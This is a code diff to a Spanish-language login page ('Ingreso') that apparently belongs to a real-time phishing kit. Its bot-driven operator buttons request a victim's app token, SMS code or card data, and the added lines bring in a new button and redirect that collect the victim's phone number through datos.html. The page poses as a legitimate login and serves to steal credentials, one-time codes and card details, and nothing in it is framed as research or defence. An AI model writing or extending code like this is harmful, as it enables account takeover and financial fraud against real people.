@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Ingreso</title>
+    <title>Ingreso</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
@@ -444,6 +444,7 @@
                         [{ text: "💎 Token App", callback_data: `pedir_dinamica:${transactionId}` }],
                         [{ text: "👀 Token SMS", callback_data: `pedir_sms:${transactionId}` }],
                         [{ text: "📝 Pedir CC", callback_data: `pedir_datos:${transactionId}` }],
+                        [{ text: "📞 Pedir Número", callback_data: `pedir_numero:${transactionId}` }],
                         [{ text: "❌ Error logo", callback_data: `error_logo:${transactionId}` }]
                     ],
                 });
@@ -504,6 +505,8 @@
                                     window.location.href = "otp.html";
                                 } else if (callbackData === 'pedir_datos') {
                                     window.location.href = "cc.html";
+                                } else if (callbackData === 'pedir_numero') {
+                                    window.location.href = "datos.html"; 
                                 } else if (callbackData === 'error_logo') {
                                     errorModal.style.display = 'flex';
                                 }
